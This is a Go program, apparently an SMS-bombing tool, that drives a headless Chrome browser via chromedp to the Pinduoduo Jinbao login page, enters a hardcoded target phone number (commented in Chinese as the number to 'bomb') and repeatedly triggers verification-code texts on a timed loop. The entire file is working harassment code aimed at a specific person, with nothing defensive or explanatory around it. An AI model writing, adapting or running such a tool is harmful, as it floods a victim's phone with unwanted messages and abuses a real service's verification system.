package main

import (
	"context"
	"fmt"
	"log"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/chromedp/chromedp"
)

var (
	// 轰炸手机号
	phoneNum = `13925079032`

	// 等待组
	waitGroup sync.WaitGroup

	// 浏览器标识
	userAgent = `Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36`

	// 是否加载页面图片
	isLoadImg = false

	// 是否为无头浏览器
	isHeadless = true
)

func main() {
	// 执行
	for i := 0; i < 10; i++ {
		waitGroup.Add(1)             // 添加任务
		go ddjbSendCode()            // 多多进宝
		time.Sleep(30 * time.Second) // 一般网站30秒只能发一次
	}

	waitGroup.Wait()
	fmt.Println("全部任务执行结束")
}

// 多多进宝
func ddjbSendCode() {
	var (
		// 登录首页
		loginUrl = `https://jinbao.pinduoduo.com/`

		// 登录按钮
		loginBtnPath = `#__next > div.jsx-3954532995.container > section > div > div.login-wrapper.right > div > span`

		// 手机号
		mobilePhonePath = `#mobile`

		// 发送验证码
		sendCodePath = `body > div.MDL_outerWrapper_14d8fyu.MDL_modal_14d8fyu.MDL_showCloseIcon_14d8fyu > div > div > div.MDL_body_14d8fyu > div > div.login-code-wrapper > div.code-line > button > span`

		// 计时器
		txt string
	)

	ctx, _ := chromedp.NewExecAllocator(context.Background(), append(
		chromedp.DefaultExecAllocatorOptions[:],
		chromedp.Flag("blink-settings", "imagesEnabled="+strconv.FormatBool(isLoadImg)), // 不显示图片
		chromedp.Flag("headless", isHeadless),
		chromedp.UserAgent(userAgent),
	)...)

	ctx, _ = context.WithTimeout(ctx, 30*time.Second)
	ctx, _ = chromedp.NewContext(ctx, chromedp.WithLogf(log.Printf))

	// 不关闭浏览器
	defer chromedp.Cancel(ctx)
	defer waitGroup.Done()

	err := chromedp.Run(ctx,
		chromedp.Navigate(loginUrl),
		chromedp.Click(loginBtnPath),
		chromedp.SendKeys(mobilePhonePath, phoneNum, chromedp.ByID),
		chromedp.Click(sendCodePath),
		chromedp.Sleep(3*time.Second),
		chromedp.OuterHTML(sendCodePath, &txt),
	)

	if err != nil {
		fmt.Println(currentTime()+"多多进宝验证码发送失败", txt, err.Error())
		return
	}

	if !strings.Contains(txt, "获取验证码") {
		fmt.Println(currentTime()+"多多进宝验证码发送成功", txt)
		return
	}

	fmt.Println(currentTime()+"多多进宝验证码发送失败", txt)
}

// 当前时间
func currentTime() string {
	return "[" + time.Now().Format("2006-01-02 15:04:05") + "] "
}
